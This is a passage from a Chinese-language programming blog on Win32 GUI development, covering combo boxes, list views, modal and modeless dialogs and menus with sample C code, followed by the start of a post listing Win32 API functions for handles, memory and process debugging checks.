WORD  code = HIWORD(wParam);<span class="comment">//消息类型</span></span><br><span class="line">		HWND   hCtrl = (HWND)lParam;<span class="comment">//窗口句柄</span></span><br><span class="line"></span><br><span class="line">		 <span class="comment">//父窗口接收到子控件发的消息</span></span><br><span class="line">		<span class="keyword">if</span> (id == <span class="number">111</span> &amp;&amp; code ==CBN_SELCHANGE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//获取当前选择的索引</span></span><br><span class="line">			<span class="keyword">int</span>   index=SendMessage(hCtrl, CB_GETCURSEL, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="comment">//获取索引对应的文本</span></span><br><span class="line">			TCHAR  buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">			SendMessage(hCtrl, CB_GETLBTEXT, index, (LPARAM)buf);</span><br><span class="line">			MessageBox(hWnd, buf, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>







<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><strong>列表控件是一个显示项目集合的控件，是 <code>Windows</code> 中的通用控件，其包含在 <code>Comctrl32.dll</code> 。<code>Windows</code> 中的通用控件在程序编译时并不会默认编译入程序，而标准控件不默认编译入程序，需要手动包含。</strong></p>
<p>列表控件在创建后，需要引入以下声明才可以使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;commctrl.h&gt;</span>			</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;comctl32.lib&quot;</span>)			</span></span><br></pre></td></tr></table></figure>





<p><del>通用控件在使用前，需要通过 <code>INITCOMMONCONTROLSEX</code> 进行初始化。</del><br><del>只要在程序中的任意地方引用了该函数就会使得 Windows 的程序加载器加载该库。</del>                </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INITCOMMONCONTROLSEX icex;				</span><br><span class="line">icex.dwSize = <span class="keyword">sizeof</span>(INITCOMMONCONTROLSEX);				</span><br><span class="line">icex.dwICC = ICC_WIN95_CLASSES;				</span><br><span class="line">InitCommonControlsEx(&amp;icex);	</span><br></pre></td></tr></table></figure>



<p>列表控件提供了4种排列和显示项目的方法，其类名是 <code>WC_LISTVIEW</code> 。该控件会向父窗口发送 <code>WM_ NOTIFY</code> 消息的形式的通知代码。</p>
<img src="/win32/Win32%20GUI/image-20210208182450925.png" alt="image-20210208182450925" style="zoom:80%;" align="left">



<h4 id="LVS-ICON"><a href="#LVS-ICON" class="headerlink" title="LVS_ICON"></a>LVS_ICON</h4><p>图像列表（<code>Image Lists</code>）是相同大小图像的一个集合，以0为图像的起始索引，它本身并不是控件，但和 <code>List View</code> 、<code>Tree View</code> 等控件一起使用。</p>
<p>ImageList Create</p>
<h4 id="LVS-REPORT"><a href="#LVS-REPORT" class="headerlink" title="LVS_REPORT"></a>LVS_REPORT</h4><h3 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h3><p>对话框分为模态对话框和非模态对话框两类。</p>
<ul>
<li>模态对话框（ <code>modal</code>）：是指在用户想要对对话框以外的应用程序进行操作时，必须首先对该对话框进行响应，如单击【确定】或【取消】按钮等将该对话框关闭，否则无法操作父窗口。</li>
<li>非模态对话框（<code>modeless</code>）：指对话框显示后，程序其他窗口仍能正常运行，可以响应用户输入，还可以相互切换。</li>
</ul>
<p><img src="/win32/Win32%20GUI/image-20210208153317296.png" alt="image-20210208153317296"></p>
<h4 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h4><p><code>MessageBox</code> 是一个模态对话框，可以通过定制 <code>MssageBox</code> 以实现不同的需求。</p>
<img src="/win32/Win32%20GUI/image-20210208160648494.png" alt="image-20210208160648494" style="zoom:67%;" align="left">



<h4 id="创建（模态）"><a href="#创建（模态）" class="headerlink" title="创建（模态）"></a>创建（模态）</h4><p><code>DialogBox</code> 宏从对话框资源模板中创建模态对话框,，<code>DialogBox</code> 宏实际使用了 <code>DialogBoxParam</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DialogBox</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   hInstance,	<span class="comment">//应用程序实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   lpTemplate,	<span class="comment">// 对话框模板，使用MAKEINTRESOURCE宏创建此值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">   hWndParent,	<span class="comment">// 父窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   lpDialogFunc	<span class="comment">//指向对话框过程的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<h4 id="回调函数-1"><a href="#回调函数-1" class="headerlink" title="回调函数"></a>回调函数</h4><p>由 <code>CreateDialog</code> 和 <code>DialogBox</code> 函数系列使用的应用程序定义的回调函数。它处理发送到模式对话框或无模式对话框的消息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DLGPROC Dlgproc;</span><br><span class="line"></span><br><span class="line"><span class="function">INT_PTR <span class="title">Dlgproc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HWND hwndDlg,		<span class="comment">//对话框窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  UINT uMsg,		<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">  WPARAM wParam,	<span class="comment">//消息附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPARAM lParam		<span class="comment">//消息附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>注：通常，如果对话框过程处理了消息，则应返回 <code>TRUE</code> ，否则应返回 <code>FALSE</code> 。如果对话框过程返回 <code>FALSE</code> ，则对话框管理器将响应该消息执行默认对话框操作。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建对话框</span></span><br><span class="line">DialogBox(GetModuleHandle(<span class="literal">NULL</span>), IDD_DIALOG_main, hwnd, DialogProc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DialogProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">	UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (uMsg) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208163329040.png" alt="image-20210208163329040" style="zoom:67%;" align="left">



<h4 id="消息处理-4"><a href="#消息处理-4" class="headerlink" title="消息处理"></a>消息处理</h4><h5 id="WM-INITDIALOG"><a href="#WM-INITDIALOG" class="headerlink" title="WM_INITDIALOG"></a>WM_INITDIALOG</h5><p>在对话框显示之前立即发送到对话框过程，对话框程序通常使用此消息来初始化控件并执行任何影响对话框外观的其他初始化任务。</p>
<h5 id="WM-CTLCOLORDLG"><a href="#WM-CTLCOLORDLG" class="headerlink" title="WM_CTLCOLORDLG"></a>WM_CTLCOLORDLG</h5><p>在系统绘制对话框之前发送到对话框。通过响应此消息，对话框可以使用指定的显示设备上下文句柄来设置其文本和背景颜色。</p>
<p>wParam中对话框的设备上下文句柄。<br>IParam的对话框的句柄。<br>如果应用程序处理此消息，则它必须返回画笔句柄，系统使用画笔绘制对话框的背景。系统不会自动<br>销毁返回的画笔，当刷子不再需要时，应用程序有责任销毁刷子。<br>请注意WM CTLCOLORDLG消息发送到对话框本身;所有其他WM CTLCOLOR *消息都发送给控件<br>的所有者。</p>
<h5 id="EndDialog"><a href="#EndDialog" class="headerlink" title="EndDialog"></a>EndDialog</h5><p><code>EndDialog</code> 函数用于销毁模态对话框，使系统结束对话框的任何处理。</p>
<p><code>EndDialog</code> 不会立即销毁对话框，它会设置一个标志， 对话框过程在尝试从应用程序队列中检索下一条消息之前,系统检查标志。如果标志被设置，系统结束消息循环，销毁对话框，并使用 <code>nResult</code> 中的值作为创建对话框的函数的返回值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get message...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;msg: %p %p\n&quot;</span>, wParam, lParam);</span><br><span class="line">    EndDialog(hwnd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>无论点击任何按钮，其产生的消息都是 <code>0x02</code> ，即 <code>WM_DESTROY</code> 消息。其本质是由于 <code>Dialog</code> 是一个对话框，执行任何操作都将会销毁对话框，且 <code>Dialog</code> 创建函数将会接收到一个返回值，这与 <code>MessageBox</code> 的特性无异。</p>
<img src="/win32/Win32%20GUI/image-20210208170324650.png" alt="image-20210208170324650" style="zoom:80%;" align="left">



<h4 id="创建（非模态）"><a href="#创建（非模态）" class="headerlink" title="创建（非模态）"></a>创建（非模态）</h4><p>非模态对话框可以使用 <code>CreateDialog</code> 函数创建，默认发送 <code>WM_INITDIALOG</code> 消息到对话框过程（回调函数），应手动 <code>ShowWindow</code> 函数显示对话框，使用 <code>DestroyWindow</code> 函数销毁对话框。非模态对话框的本质就是创建窗口，销毁使用 <code>DestroyWindows</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWND <span class="title">CreateDialog</span><span class="params">(	<span class="comment">// 返回非模态对话框的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   hInstance,		<span class="comment">// 当前程序实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   lpName,			<span class="comment">// 模板名</span></span></span></span><br><span class="line"><span class="params"><span class="function">   hWndParent,		<span class="comment">// 父窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   lpDialogFunc		<span class="comment">// 回调函数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建非模态对话框</span></span><br><span class="line">HWND hDialog = CreateDialog(GetModuleHandle(<span class="literal">NULL</span>), IDD_DIALOG_main, hwnd, DialogProc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DialogProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">	UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (uMsg) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Dialog init...\n&quot;</span>);</span><br><span class="line">			ShowWindow(hwnd, SW_SHOW);</span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;get message...\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;msg: %p %p\n&quot;</span>, wParam, lParam);</span><br><span class="line">			DestroyWindow(hwnd);</span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，在没有对对话框进行操作的情况下依然可以对主窗口进行操作。</p>
<p><img src="/win32/Win32%20GUI/image-20210208172525566.png" alt="image-20210208172525566"></p>
<h4 id="创建主界面（非）"><a href="#创建主界面（非）" class="headerlink" title="创建主界面（非）"></a>创建主界面（非）</h4><p>我们可以使用非模态对话框创建程序主界面，通过可视化的图形界面创建窗口，可以极大的提高开发效率。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的对话框窗口过程</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DialogProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hwnd, </span></span></span><br><span class="line"><span class="params"><span class="function">	UINT Msg, </span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam, </span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (Msg)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//设置对话框标题</span></span><br><span class="line">			SetWindowText(hwnd, <span class="string">L&quot;LoadPE by walker&quot;</span>);</span><br><span class="line">			<span class="comment">//设置对话框图标</span></span><br><span class="line">			HICON icon = LoadIcon(GetModuleHandle(<span class="literal">NULL</span>), MAKEINTRESOURCE(IDI_ICON_exeico));</span><br><span class="line">			SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)icon);</span><br><span class="line">			DestroyIcon(icon);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> IDCANCEL:</span><br><span class="line">				&#123;</span><br><span class="line">					DestroyWindow(hwnd);<span class="comment">//销毁非模态对话框</span></span><br><span class="line">					PostQuitMessage(<span class="number">0</span>);	<span class="comment">//WM_QUIT退出消息循环</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HINSTANCE hInstance, </span></span></span><br><span class="line"><span class="params"><span class="function">	HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR lpCmdLine, </span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> nShowCmd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建非模态对话框</span></span><br><span class="line">	HWND hDlg = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_DIALOG_main),GetDesktopWindow(), DialogProc);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//显示对话框</span></span><br><span class="line">	ShowWindow(hDlg, SW_SHOW);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//消息循环</span></span><br><span class="line">	MSG  msg;</span><br><span class="line">	<span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		TranslateMessage(&amp;msg);</span><br><span class="line">		DispatchMessage(&amp;msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210208180425088.png" alt="image-20210208180425088" style="zoom:80%;" align="left">





<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><p><code>Windows</code> 程序的菜单，分为三大类：系统菜单、顶层菜单、弹出式菜单（右键菜单）。</p>
<p><img src="/win32/Win32%20GUI/image-20210215142827558.png" alt="image-20210215142827558"></p>
<p><img src="/win32/Win32%20GUI/image-20210215142728919.png" alt="image-20210215142728919"></p>
<h4 id="顶层菜单"><a href="#顶层菜单" class="headerlink" title="顶层菜单"></a>顶层菜单</h4><p>（略）</p>
<h4 id="快捷菜单"><a href="#快捷菜单" class="headerlink" title="快捷菜单"></a>快捷菜单</h4><p>快捷菜单，即弹出菜单、右键菜单。我们可以调用 <code>CreatePopupMenu</code> 函数可以创建一个弹出菜单对象（子菜单），然后响应鼠标右键 <code>WM_ RBUTTONDOWN</code> 消息，使用 <code>TrackPopupMenu</code> 函数可以轻松实现右键菜单属性。</p>
<p>当我们使用函数创建右键菜单后，菜单项是空的，我们可以使用 <code>InsertMenuItem</code> 函数来插入菜单项我们还可以使用 <code>InsertMenu</code> 和 <code>AppendMenu</code> 函数来添加菜单项。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://walker-nie.github.io/win32/Win32/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fup.enterdesk.com%2Fedpic%2Ff6%2Fc9%2Ff6%2Ff6c9f647a533782026c0609ac5d550df.jpg&refer=http%3A%2F%2Fup.enterdesk.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643531815&t=c2c18e0685888311dca4f731dd286208">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="walker's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/win32/Win32/" itemprop="url">win32</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-03T13:13:26+08:00">
                2022-01-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/win32/" itemprop="url" rel="index">
                    <span itemprop="name">win32</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5,142 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  25 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h1><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p><code>Win32 API </code> 的分类如下表：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
<th>dll</th>
</tr>
</thead>
<tbody><tr>
<td>基础服务（Base Services）</td>
<td>内核函数，提供对Windows系统基础资源的访问接口。如文件系统、内存管理、外部设备、进程(process) 、线程(thread) 以及访问注册表和错误处理机制。</td>
<td>kernel32.dlI</td>
</tr>
<tr>
<td>图形设备接口（GDI）</td>
<td>输出图形内容到显示器、打印机以及其他外部输出设备。</td>
<td>gdi32.dll</td>
</tr>
<tr>
<td>图形化用户界面（GUI）</td>
<td>Windows用户界面相关应用程序接口，提供的功能有创建和管理屏幕和大多数基本控件（control）。如创建窗口、滚动条、消息、菜单、光标、计时器和发送消息以及其他与GUI有关的功能。</td>
<td>user32.dll</td>
</tr>
<tr>
<td>通用控件链接库（Common Control Library）</td>
<td>为应用程序提供接口来访问操作系统提供的一些高级控件。如：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar) 和标签（tab)。</td>
<td>comctl32.dlI</td>
</tr>
<tr>
<td>Windows外壳（Windows Shell）</td>
<td>作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。</td>
<td>shell32.dII</td>
</tr>
<tr>
<td>网络服务（Network Services）</td>
<td>为访问操作系统提供的多种网络功能提供接口。它包括NetBIOS、Winsock、 NetDDE及RPC等。</td>
<td>ws2_ 32.dIl</td>
</tr>
</tbody></table>
<h3 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h3><table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>GetModuleHandle</td>
<td>通过进程名获取进程句柄（<code>NULL</code> 表示获取当前进程）<br>获取的值位模块的基址</td>
</tr>
<tr>
<td>OpenProcess</td>
<td>通过进程 <code>PID</code> 获取进程句柄</td>
</tr>
<tr>
<td>GetProcessImageFileName</td>
<td>通过进程句柄获取程序文件路径</td>
</tr>
<tr>
<td>GetCurrentProcess</td>
<td>获取当前进程的句柄</td>
</tr>
<tr>
<td>GetCurrentThread</td>
<td>获取当前线程的句柄</td>
</tr>
<tr>
<td>GetCurrentProcessId</td>
<td>获取当前进程的 <code>PID</code></td>
</tr>
<tr>
<td>EnumProcessModules</td>
<td>通过进程句柄遍历进程模块</td>
</tr>
<tr>
<td>OutputDebugString</td>
<td>输出调试信息</td>
</tr>
<tr>
<td>PathFindFileName</td>
<td>根据文件路径获取文件名</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>GetThreadId</td>
<td>通过线程句柄获取线程 <code>ID</code></td>
</tr>
<tr>
<td>CreateFileMapping</td>
<td>创建共享内存</td>
</tr>
<tr>
<td>MapViewOfFile</td>
<td>将共享内存映射进进程空间</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>注：</p>
<p>使用 <code>PathFindFileName</code> 函数时，需要加载以下文件头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlwapi.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Shlwapi.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>



<h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualProtectEx</td>
<td>设置指定进程的页面属性</td>
</tr>
<tr>
<td>VirtualProtect</td>
<td>设置本进程的页面属性</td>
</tr>
<tr>
<td>VirtualAllocEx</td>
<td>通过进程句柄为特定进程申请内存</td>
</tr>
<tr>
<td>VirtualAlloc</td>
<td>为本进程申请内存</td>
</tr>
<tr>
<td>VirtualFreeEx</td>
<td>通过进程句柄为特定进程释放内存</td>
</tr>
<tr>
<td>VirtualFree</td>
<td>为本进程释放内存</td>
</tr>
<tr>
<td>CreateFileMapping</td>
<td>申请共享内存</td>
</tr>
<tr>
<td>MapViewOfFile</td>
<td>将共享内存映射入进程空间</td>
</tr>
<tr>
<td>SetWindowsHookExA</td>
<td>设置钩子</td>
</tr>
</tbody></table>
<h3 id="进程安全"><a href="#进程安全" class="headerlink" title="进程安全"></a>进程安全</h3><table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>IsDebuggerPresent</td>
<td>检查本进程是否被三环调试器调试</td>
</tr>
<tr>
<td>CheckRemoteDebuggerPresent</td>
<td>检查是否存在远程调试指定进程</td>
</tr>
<tr>
<td>TerminateProcess</td>
<td>通过进程句柄终结进程及其所有子线程</td>
</tr>
<tr>
<td>QueueUserAPC</td>
